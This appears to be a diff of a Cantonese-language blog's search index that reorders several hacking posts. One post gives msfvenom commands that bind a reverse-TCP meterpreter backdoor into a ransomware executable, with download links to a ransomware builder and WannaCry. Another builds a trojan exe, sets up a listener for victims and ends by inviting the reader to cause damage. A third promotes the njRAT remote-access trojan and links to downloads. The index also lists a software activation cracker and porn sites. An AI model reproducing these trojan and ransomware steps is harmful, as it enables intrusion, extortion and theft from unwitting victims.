-        <tag>病毒</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Metasploit - exe 注入 Ransomware 程式 (非常仆街)</title>
-    <url>/2022/01/09/Metasploit-Ransomware-Attack/</url>
-    <content><![CDATA[<h1 id="Requirements"><a href="#Requirements" class="headerlink" title="Requirements"></a>Requirements</h1><ul>
-<li>Ransomware Builder Or Ransomware File.</li>
-<li>a Windows Victim PC</li>
-<li>A Linux for Metasploit using</li>
-</ul>
-<p>U can download Ransomware builder from here.<br><a href="http://www.mediafire.com/file/rpeo9mwl59rlwe7/ransomware_builder_pack.rar/file">http://www.mediafire.com/file/rpeo9mwl59rlwe7/ransomware_builder_pack.rar/file</a></p>
-<p>U can download Wannacry from here.<br><a href="https://www.upload.ee/files/7001087/1.7z.html">https://www.upload.ee/files/7001087/1.7z.html</a></p>
-<p>U can download Wanakiwi from hero.<br><a href="https://github.com/gentilkiwi/wanakiwi">https://github.com/gentilkiwi/wanakiwi</a></p>
-<p>the program will be like :</p>
-<img src="/2022/01/09/Metasploit-Ransomware-Attack/ransomware-builder.png" class="">
-
-<p>Then click on the build, it will create Ransomware for us, then create a key using the same application.</p>
-<p>Now we having Ransomware and its key.</p>
-<img src="/2022/01/09/Metasploit-Ransomware-Attack/program2.png" class="">
-
-<p>Next Step we need use msfvenom to gen a trojan file. (Backdooring)</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -x ransomware.exe -k -p windows/meterpreter/reverse_tcp lhost=[your ipv4] lport=[your port] -e x86/shikata_ga_nai -i 3 -b &quot;\x00&quot; -f exe -o ransomware.exe</span><br></pre></td></tr></table></figure>
-
-<p>OK, Now open metasploit</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
-
-<p>Set payload, LPORT, LHOST using multi/handler and listening for a reverse TCP connection.</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">multi/handler</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set lhost [your private ipv4]</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set [your port]</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
-
-<p>Now,waiting the victim open the file.</p>
-<img src="/2022/01/09/Metasploit-Ransomware-Attack/wannacry2.0.png" class="">
-
-<p>Very simple.</p>
-<h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks:"></a>Thanks:</h1><p><a href="https://hackersdude.com/ransomware-attack-using-metasploit/">https://hackersdude.com/ransomware-attack-using-metasploit/</a></p>
-]]></content>
-      <categories>
-        <category>Metasploit</category>
-      </categories>
-      <tags>
-        <tag>指令</tag>
-        <tag>Ransomware</tag>
       </tags>
   </entry>
   <entry>
@@ -4529,6 +4480,92 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
       </tags>
   </entry>
   <entry>
+    <title>Metasploit - 外網木馬生成 (Windows exe)</title>
+    <url>/2021/12/13/Metasploit-wan-exe/</url>
+    <content><![CDATA[<img src="/img/Post/image/Metasploit/cover.svg" width="200px"/>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以下教學全程會用指令操作所有野，<br>學好指令點打會更加得心應手，<br>唔係既話，<br>係會跟得好辛苦。</p>
+<p><strong><span style="font-size:larger;">需要工具</span></strong></p>
+<ul>
+<li><a href="https://www.metasploit.com/">Metasploit</a> (Trojan 生成，操控中毒者電腦)</li>
+<li><a href="https://ubuntu.com/download">Linux 系統</a> (本文章使用 Ubuntu)</li>
+<li><a href="https://noob.tw/ufw/">ufw</a> (Linux 防火牆)</li>
+<li><a href="https://curl.se/">curl</a> (下載 Metasploit,查你既 Public IP)</li>
+</ul>
+<h2 id="curl-安裝"><a href="#curl-安裝" class="headerlink" title="curl 安裝"></a>curl 安裝</h2><p>首先我地要查下你既 Public IP 係乜，<br>打 <code>curl</code> 睇下有冇裝到，<br>部機如果冇，<br>即係冇裝到，<br>咁打返呢句裝返 ~~</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install curl</span><br></pre></td></tr></table></figure>
+
+<h3 id="查-Public-IP"><a href="#查-Public-IP" class="headerlink" title="查 Public IP"></a>查 Public IP</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl ifconfig.me <span class="comment">#Print既 result 就係你既 Public IP Address</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="安裝-ufw"><a href="#安裝-ufw" class="headerlink" title="安裝 ufw"></a>安裝 ufw</h2><p>ufw 係一個防火牆工具，<br>我地會用佢黎 set open port (tcp)。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install ufw -y</span><br></pre></td></tr></table></figure>
+
+<h3 id="啟用-ufw"><a href="#啟用-ufw" class="headerlink" title="啟用 ufw"></a>啟用 ufw</h3><p>當你成功安裝 ufw，<br>預設係唔會為你開啟 ufw，<br>我地需要用指令去為佢開啟返個程式。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ufw <span class="built_in">enable</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="開啟-Port-位置"><a href="#開啟-Port-位置" class="headerlink" title="開啟 Port 位置"></a>開啟 Port 位置</h4><p>今次我會用 tcp 同埋 <code>7777</code> Port Number.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ufw allow 7777/tcp</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Wan-Trojan-生成"><a href="#Wan-Trojan-生成" class="headerlink" title="Wan Trojan 生成"></a>Wan Trojan 生成</h2><p>用 msfvenom 生成 後門 <code>exe</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=7777 -f exe &gt; fuckyou.exe</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>LHOST 你既 Public IP Address</li>
+<li>LPORT 你岩岩開左既 Port Number</li>
+<li>fuckyou.exe 是但改個你鍾意既 exe file 名</li>
+</ul>
+<p>完成兩個步驟，包括係 :</p>
+<ul>
+<li>setup open port</li>
+<li>生成後門 <code>exe</code> 檔</li>
+</ul>
+<h2 id="設置監聽"><a href="#設置監聽" class="headerlink" title="設置監聽"></a>設置監聽</h2><p>當成功設置上述既野既時候，<br>接下來我地要做既係 setup 你既 metasploit 既控制台 (控制人地電腦)。</p>
+<h3 id="開啟-msfconsole"><a href="#開啟-msfconsole" class="headerlink" title="開啟 msfconsole"></a>開啟 msfconsole</h3><p>開 Terminal 打</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/13/Metasploit-wan-exe/OPEN.png" class="">
+
+
+<h3 id="Payload-進入"><a href="#Payload-進入" class="headerlink" title="Payload 進入"></a>Payload 進入</h3><p>喺呢度輸入兩句。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<h4 id="Payload-設置"><a href="#Payload-設置" class="headerlink" title="Payload 設置"></a>Payload 設置</h4><p>而加我地要將自己既 ip 打入去 options 度，<br>我地而加係要做 Host，<br>但係 msfconsole 仲未知道你係 Host，<br>我地喺控制台度打 <code>show options</code>。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
+
+<h4 id="查-Private-IP"><a href="#查-Private-IP" class="headerlink" title="查 Private IP"></a>查 Private IP</h4><p>黎到呢個位我地開另一個 Terminal 查我地而加既 Private IP 係乜，<br>再將查到既呢個 Private IP 輸入去 msfconsole。</p>
+<h4 id="安裝-net-tools"><a href="#安裝-net-tools" class="headerlink" title="安裝 net-tools"></a>安裝 net-tools</h4><p>打 <code>ifconfig</code> 查我地既 lan ip address係乜</p>
+<p>如果你部機打 <code>ifconfig</code> 冇反應，<br>咁打返呢句裝返。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install net-tools -y</span><br></pre></td></tr></table></figure>
+
+<h4 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h4><p>我地喺 Terminal 打以下指令，<br>搵第一個既 <code>inet</code>，就係我地既 LAN ip addrss，<br>查到之後就將你既 LAN ip address 打入去。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
+
+<h3 id="輸入-Private-IP"><a href="#輸入-Private-IP" class="headerlink" title="輸入 Private IP"></a>輸入 Private IP</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> LHOST [your lan ipv4]</span><br></pre></td></tr></table></figure>
+
+<p>改埋你岩岩開左既 Port Number</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> LPORT [number]</span><br></pre></td></tr></table></figure>
+
+<h3 id="確定數值"><a href="#確定數值" class="headerlink" title="確定數值"></a>確定數值</h3><p>做一個確定。<br>我地睇下個 set 既野岩唔岩 ~</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
+<h2 id="開始監聽"><a href="#開始監聽" class="headerlink" title="開始監聽"></a>開始監聽</h2><p>確定哂之後你就可以輸入以下指令開始監聽，<br>等待某人開啟呢個程式，<br>然後呢邊 (Server)，就會有即時反應，<br>然後就成功入侵 ~</p>
+<img src="/2021/12/13/Metasploit-wan-exe/exploit.png" class="">
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<h3 id="入侵成功"><a href="#入侵成功" class="headerlink" title="入侵成功"></a>入侵成功</h3><p>見到佢開左就會自動有反應</p>
+<p>去到呢個位你就可以搞破壞啦 ~~</p>
+<img src="/2021/12/13/Metasploit-wan-exe/exploit-2.png" class="">]]></content>
+      <categories>
+        <category>Metasploit</category>
+      </categories>
+      <tags>
+        <tag>指令</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Microsoft Toolkit - MS Office 同 Windows 既破解器</title>
     <url>/2022/01/22/Microsoft-Toolkit/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Microsoft Toolkit 是用於激活 Windows 和 MS Office 等 Microsoft 產品的軟件的最新版本，它是 KMSPico Activator 的替代品，它的工作原理幾乎相同，但有幾個新功能。 這是激活 Windows 10、8.1、8、7、Vista 和 Windows XP 等任何 Windows 的最佳工具。<br>不僅可以幫助您激活 Windows，還可以激活 Microsoft Office。<br>它是互聯網上 100% 安全可靠的激活器。</p>
@@ -4615,89 +4652,52 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
       </tags>
   </entry>
   <entry>
-    <title>Metasploit - 外網木馬生成 (Windows exe)</title>
-    <url>/2021/12/13/Metasploit-wan-exe/</url>
-    <content><![CDATA[<img src="/img/Post/image/Metasploit/cover.svg" width="200px"/>
-
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以下教學全程會用指令操作所有野，<br>學好指令點打會更加得心應手，<br>唔係既話，<br>係會跟得好辛苦。</p>
-<p><strong><span style="font-size:larger;">需要工具</span></strong></p>
-<ul>
-<li><a href="https://www.metasploit.com/">Metasploit</a> (Trojan 生成，操控中毒者電腦)</li>
-<li><a href="https://ubuntu.com/download">Linux 系統</a> (本文章使用 Ubuntu)</li>
-<li><a href="https://noob.tw/ufw/">ufw</a> (Linux 防火牆)</li>
-<li><a href="https://curl.se/">curl</a> (下載 Metasploit,查你既 Public IP)</li>
+    <title>Metasploit - exe 注入 Ransomware 程式 (非常仆街)</title>
+    <url>/2022/01/09/Metasploit-Ransomware-Attack/</url>
+    <content><![CDATA[<h1 id="Requirements"><a href="#Requirements" class="headerlink" title="Requirements"></a>Requirements</h1><ul>
+<li>Ransomware Builder Or Ransomware File.</li>
+<li>a Windows Victim PC</li>
+<li>A Linux for Metasploit using</li>
 </ul>
-<h2 id="curl-安裝"><a href="#curl-安裝" class="headerlink" title="curl 安裝"></a>curl 安裝</h2><p>首先我地要查下你既 Public IP 係乜，<br>打 <code>curl</code> 睇下有冇裝到，<br>部機如果冇，<br>即係冇裝到，<br>咁打返呢句裝返 ~~</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install curl</span><br></pre></td></tr></table></figure>
+<p>U can download Ransomware builder from here.<br><a href="http://www.mediafire.com/file/rpeo9mwl59rlwe7/ransomware_builder_pack.rar/file">http://www.mediafire.com/file/rpeo9mwl59rlwe7/ransomware_builder_pack.rar/file</a></p>
+<p>U can download Wannacry from here.<br><a href="https://www.upload.ee/files/7001087/1.7z.html">https://www.upload.ee/files/7001087/1.7z.html</a></p>
+<p>U can download Wanakiwi from hero.<br><a href="https://github.com/gentilkiwi/wanakiwi">https://github.com/gentilkiwi/wanakiwi</a></p>
+<p>the program will be like :</p>
+<img src="/2022/01/09/Metasploit-Ransomware-Attack/ransomware-builder.png" class="">
 
-<h3 id="查-Public-IP"><a href="#查-Public-IP" class="headerlink" title="查 Public IP"></a>查 Public IP</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl ifconfig.me <span class="comment">#Print既 result 就係你既 Public IP Address</span></span><br></pre></td></tr></table></figure>
+<p>Then click on the build, it will create Ransomware for us, then create a key using the same application.</p>
+<p>Now we having Ransomware and its key.</p>
+<img src="/2022/01/09/Metasploit-Ransomware-Attack/program2.png" class="">
 
-<h2 id="安裝-ufw"><a href="#安裝-ufw" class="headerlink" title="安裝 ufw"></a>安裝 ufw</h2><p>ufw 係一個防火牆工具，<br>我地會用佢黎 set open port (tcp)。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install ufw -y</span><br></pre></td></tr></table></figure>
+<p>Next Step we need use msfvenom to gen a trojan file. (Backdooring)</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -x ransomware.exe -k -p windows/meterpreter/reverse_tcp lhost=[your ipv4] lport=[your port] -e x86/shikata_ga_nai -i 3 -b &quot;\x00&quot; -f exe -o ransomware.exe</span><br></pre></td></tr></table></figure>
 
-<h3 id="啟用-ufw"><a href="#啟用-ufw" class="headerlink" title="啟用 ufw"></a>啟用 ufw</h3><p>當你成功安裝 ufw，<br>預設係唔會為你開啟 ufw，<br>我地需要用指令去為佢開啟返個程式。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ufw <span class="built_in">enable</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="開啟-Port-位置"><a href="#開啟-Port-位置" class="headerlink" title="開啟 Port 位置"></a>開啟 Port 位置</h4><p>今次我會用 tcp 同埋 <code>7777</code> Port Number.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ufw allow 7777/tcp</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Wan-Trojan-生成"><a href="#Wan-Trojan-生成" class="headerlink" title="Wan Trojan 生成"></a>Wan Trojan 生成</h2><p>用 msfvenom 生成 後門 <code>exe</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=7777 -f exe &gt; fuckyou.exe</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>LHOST 你既 Public IP Address</li>
-<li>LPORT 你岩岩開左既 Port Number</li>
-<li>fuckyou.exe 是但改個你鍾意既 exe file 名</li>
-</ul>
-<p>完成兩個步驟，包括係 :</p>
-<ul>
-<li>setup open port</li>
-<li>生成後門 <code>exe</code> 檔</li>
-</ul>
-<h2 id="設置監聽"><a href="#設置監聽" class="headerlink" title="設置監聽"></a>設置監聽</h2><p>當成功設置上述既野既時候，<br>接下來我地要做既係 setup 你既 metasploit 既控制台 (控制人地電腦)。</p>
-<h3 id="開啟-msfconsole"><a href="#開啟-msfconsole" class="headerlink" title="開啟 msfconsole"></a>開啟 msfconsole</h3><p>開 Terminal 打</p>
+<p>OK, Now open metasploit</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
 
-<img src="/2021/12/13/Metasploit-wan-exe/OPEN.png" class="">
+<p>Set payload, LPORT, LHOST using multi/handler and listening for a reverse TCP connection.</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">multi/handler</span><br></pre></td></tr></table></figure>
 
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
 
-<h3 id="Payload-進入"><a href="#Payload-進入" class="headerlink" title="Payload 進入"></a>Payload 進入</h3><p>喺呢度輸入兩句。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set lhost [your private ipv4]</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set [your port]</span><br></pre></td></tr></table></figure>
 
-<h4 id="Payload-設置"><a href="#Payload-設置" class="headerlink" title="Payload 設置"></a>Payload 設置</h4><p>而加我地要將自己既 ip 打入去 options 度，<br>我地而加係要做 Host，<br>但係 msfconsole 仲未知道你係 Host，<br>我地喺控制台度打 <code>show options</code>。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
-<h4 id="查-Private-IP"><a href="#查-Private-IP" class="headerlink" title="查 Private IP"></a>查 Private IP</h4><p>黎到呢個位我地開另一個 Terminal 查我地而加既 Private IP 係乜，<br>再將查到既呢個 Private IP 輸入去 msfconsole。</p>
-<h4 id="安裝-net-tools"><a href="#安裝-net-tools" class="headerlink" title="安裝 net-tools"></a>安裝 net-tools</h4><p>打 <code>ifconfig</code> 查我地既 lan ip address係乜</p>
-<p>如果你部機打 <code>ifconfig</code> 冇反應，<br>咁打返呢句裝返。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install net-tools -y</span><br></pre></td></tr></table></figure>
+<p>Now,waiting the victim open the file.</p>
+<img src="/2022/01/09/Metasploit-Ransomware-Attack/wannacry2.0.png" class="">
 
-<h4 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h4><p>我地喺 Terminal 打以下指令，<br>搵第一個既 <code>inet</code>，就係我地既 LAN ip addrss，<br>查到之後就將你既 LAN ip address 打入去。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
-
-<h3 id="輸入-Private-IP"><a href="#輸入-Private-IP" class="headerlink" title="輸入 Private IP"></a>輸入 Private IP</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> LHOST [your lan ipv4]</span><br></pre></td></tr></table></figure>
-
-<p>改埋你岩岩開左既 Port Number</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> LPORT [number]</span><br></pre></td></tr></table></figure>
-
-<h3 id="確定數值"><a href="#確定數值" class="headerlink" title="確定數值"></a>確定數值</h3><p>做一個確定。<br>我地睇下個 set 既野岩唔岩 ~</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
-<h2 id="開始監聽"><a href="#開始監聽" class="headerlink" title="開始監聽"></a>開始監聽</h2><p>確定哂之後你就可以輸入以下指令開始監聽，<br>等待某人開啟呢個程式，<br>然後呢邊 (Server)，就會有即時反應，<br>然後就成功入侵 ~</p>
-<img src="/2021/12/13/Metasploit-wan-exe/exploit.png" class="">
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
-
-<h3 id="入侵成功"><a href="#入侵成功" class="headerlink" title="入侵成功"></a>入侵成功</h3><p>見到佢開左就會自動有反應</p>
-<p>去到呢個位你就可以搞破壞啦 ~~</p>
-<img src="/2021/12/13/Metasploit-wan-exe/exploit-2.png" class="">]]></content>
+<p>Very simple.</p>
+<h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks:"></a>Thanks:</h1><p><a href="https://hackersdude.com/ransomware-attack-using-metasploit/">https://hackersdude.com/ransomware-attack-using-metasploit/</a></p>
+]]></content>
       <categories>
         <category>Metasploit</category>
       </categories>
       <tags>
         <tag>指令</tag>
+        <tag>Ransomware</tag>
       </tags>
   </entry>
   <entry>
@@ -4815,42 +4815,6 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
       </tags>
   </entry>
   <entry>
-    <title>Njrat - 針對 Windows 機控制木馬程式工具 (RAT)</title>
-    <url>/2022/02/02/Njrat-trojan-tools/</url>
-    <content><![CDATA[<h1 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h1><p>njRAT，也稱為Bladabindi，是一種遠程訪問工具或特洛伊木馬，允許程序所有者控制最終用戶的計算機。它於2013年6月首次發現，其某些變體可追溯至2012年11月。</p>
-<p>不過呢個版本係改版，更加多功能，原作者係叫 njq8</p>
-<h2 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h2><ul>
-<li>Desktop Control</li>
-<li>Control Camera / cam</li>
-<li>The process manager / task manager</li>
-<li>Keylogger: Seeing Anything That goal has typed on pc</li>
-<li>Create message: to chat Jump WITH Victims</li>
-<li>Check Password: Seeing ALL That Saved passwords in the browser application</li>
-<li>Server:Update: Update through Link, Update through Disk Restart Remove Server Resolve Network Change the name in Remove</li>
-</ul>
-<h2 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h2><img src="/2022/02/02/Njrat-trojan-tools/sc1.png" class="">
-
-<h2 id="Github-改版作者"><a href="#Github-改版作者" class="headerlink" title="Github (改版作者)"></a>Github (改版作者)</h2><ul>
-<li><a href="https://github.com/TheC0mpany/NjRat-0.7D-Green-Edition-by-im523">https://github.com/TheC0mpany/NjRat-0.7D-Green-Edition-by-im523</a></li>
-<li><a href="https://github.com/OneParsec/njRAT">https://github.com/OneParsec/njRAT</a></li>
-</ul>
-<h2 id="下載-原版"><a href="#下載-原版" class="headerlink" title="下載 (原版)"></a>下載 (原版)</h2><ul>
-<li><a href="https://www.connect-trojan.com/details.php?id=4941">https://www.connect-trojan.com/details.php?id=4941</a></li>
-<li><a href="https://tools.infected-zone.com/index.php">https://tools.infected-zone.com/index.php</a></li>
-<li><a href="https://github.com/TheC0mpany/njRAT-v0.6.4-by-njq8">https://github.com/TheC0mpany/njRAT-v0.6.4-by-njq8</a></li>
-</ul>
-<h2 id="程式圖片-1"><a href="#程式圖片-1" class="headerlink" title="程式圖片"></a>程式圖片</h2><img src="/2022/02/02/Njrat-trojan-tools/about.png" class="">
-<img src="/2022/02/02/Njrat-trojan-tools/by.png" class="">
-<img src="/2022/02/02/Njrat-trojan-tools/hacked.png" class="">]]></content>
-      <categories>
-        <category>Windows</category>
-      </categories>
-      <tags>
-        <tag>Hacking</tag>
-        <tag>特洛伊木馬 (Trojan)</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Nmap - 探測計算機網絡的工具</title>
     <url>/2021/12/14/Nmap-commands/</url>
     <content><![CDATA[<h1 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h1><p>Nmap（網絡映射器）是由 Gordon Lyon（他的筆名 Fyodor Vaskovich）創建的免費開源網絡掃描儀。<br>Nmap用於通過發送數據包和分析響應來發現計算機網絡上的主機和服務。<br>Nmap 提供了許多用於探測計算機網絡的功能，包括主機發現和服務以及操作系統檢測。<br>這些功能可通過提供更高級服務檢測、漏洞檢測、和其他功能的腳本進行擴展。<br>Nmap 可以適應網絡條件，包括掃描期間的延遲和擁塞。</p>
@@ -4893,6 +4857,42 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
       </categories>
       <tags>
         <tag>指令</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Njrat - 針對 Windows 機控制木馬程式工具 (RAT)</title>
+    <url>/2022/02/02/Njrat-trojan-tools/</url>
+    <content><![CDATA[<h1 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h1><p>njRAT，也稱為Bladabindi，是一種遠程訪問工具或特洛伊木馬，允許程序所有者控制最終用戶的計算機。它於2013年6月首次發現，其某些變體可追溯至2012年11月。</p>
+<p>不過呢個版本係改版，更加多功能，原作者係叫 njq8</p>
+<h2 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h2><ul>
+<li>Desktop Control</li>
+<li>Control Camera / cam</li>
+<li>The process manager / task manager</li>
+<li>Keylogger: Seeing Anything That goal has typed on pc</li>
+<li>Create message: to chat Jump WITH Victims</li>
+<li>Check Password: Seeing ALL That Saved passwords in the browser application</li>
+<li>Server:Update: Update through Link, Update through Disk Restart Remove Server Resolve Network Change the name in Remove</li>
+</ul>
+<h2 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h2><img src="/2022/02/02/Njrat-trojan-tools/sc1.png" class="">
+
+<h2 id="Github-改版作者"><a href="#Github-改版作者" class="headerlink" title="Github (改版作者)"></a>Github (改版作者)</h2><ul>
+<li><a href="https://github.com/TheC0mpany/NjRat-0.7D-Green-Edition-by-im523">https://github.com/TheC0mpany/NjRat-0.7D-Green-Edition-by-im523</a></li>
+<li><a href="https://github.com/OneParsec/njRAT">https://github.com/OneParsec/njRAT</a></li>
+</ul>
+<h2 id="下載-原版"><a href="#下載-原版" class="headerlink" title="下載 (原版)"></a>下載 (原版)</h2><ul>
+<li><a href="https://www.connect-trojan.com/details.php?id=4941">https://www.connect-trojan.com/details.php?id=4941</a></li>
+<li><a href="https://tools.infected-zone.com/index.php">https://tools.infected-zone.com/index.php</a></li>
+<li><a href="https://github.com/TheC0mpany/njRAT-v0.6.4-by-njq8">https://github.com/TheC0mpany/njRAT-v0.6.4-by-njq8</a></li>
+</ul>
+<h2 id="程式圖片-1"><a href="#程式圖片-1" class="headerlink" title="程式圖片"></a>程式圖片</h2><img src="/2022/02/02/Njrat-trojan-tools/about.png" class="">
+<img src="/2022/02/02/Njrat-trojan-tools/by.png" class="">
+<img src="/2022/02/02/Njrat-trojan-tools/hacked.png" class="">]]></content>
+      <categories>
+        <category>Windows</category>
+      </categories>
+      <tags>
+        <tag>Hacking</tag>
+        <tag>特洛伊木馬 (Trojan)</tag>
       </tags>
   </entry>
   <entry>
@@ -4974,6 +4974,30 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
       </tags>
   </entry>
   <entry>
+    <title>成人網站大全 - 不含殘體網</title>
+    <url>/2022/01/22/Porn-web-list/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>睇咸網打個飛機又唔知去咩網好？<br>唔緊要，呢度我擺條 List 俾你慢慢 J 飽佢！</p>
+<h2 id="真人網站-主要"><a href="#真人網站-主要" class="headerlink" title="真人網站 (主要)"></a>真人網站 (主要)</h2><h3 id="Pornhub"><a href="#Pornhub" class="headerlink" title="Pornhub"></a>Pornhub</h3><img src="/2022/01/22/Porn-web-list/pornhub.png" class="">
+<p><a href="https://www.pornhub.com/">https://www.pornhub.com/</a></p>
+<h3 id="porn87"><a href="#porn87" class="headerlink" title="porn87"></a>porn87</h3><img src="/2022/01/22/Porn-web-list/porn87.png" class="">
+<p>porn87.com</p>
+<h3 id="thisav"><a href="#thisav" class="headerlink" title="thisav"></a>thisav</h3><img src="/2022/01/22/Porn-web-list/thisav.png" class="">
+<p>thisav.com</p>
+<h2 id="動畫網站-主要"><a href="#動畫網站-主要" class="headerlink" title="動畫網站 (主要)"></a>動畫網站 (主要)</h2><h3 id="avbebe"><a href="#avbebe" class="headerlink" title="avbebe"></a>avbebe</h3><img src="/2022/01/22/Porn-web-list/avbebe.png" class="">
+<p><a href="https://avbebe.com/">https://avbebe.com/</a></p>
+<h3 id="hanime-tv"><a href="#hanime-tv" class="headerlink" title="hanime.tv"></a>hanime.tv</h3><img src="/2022/01/22/Porn-web-list/hanime.png" class="">
+<p><a href="https://hanime.tv/">https://hanime.tv/</a></p>
+<h3 id="hanime1"><a href="#hanime1" class="headerlink" title="hanime1"></a>hanime1</h3><img src="/2022/01/22/Porn-web-list/hanime1.png" class="">
+<p><a href="https://hanime1.me/">https://hanime1.me/</a></p>
+]]></content>
+      <categories>
+        <category>甜網</category>
+      </categories>
+      <tags>
+        <tag>成人</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PCSX2 - PlayStation 2 模擬器</title>
     <url>/2022/05/20/PS2-Virtual-Machine-emalator-pcsx2/</url>
     <content><![CDATA[<img src="/2022/05/20/PS2-Virtual-Machine-emalator-pcsx2/cover.webp" class="">
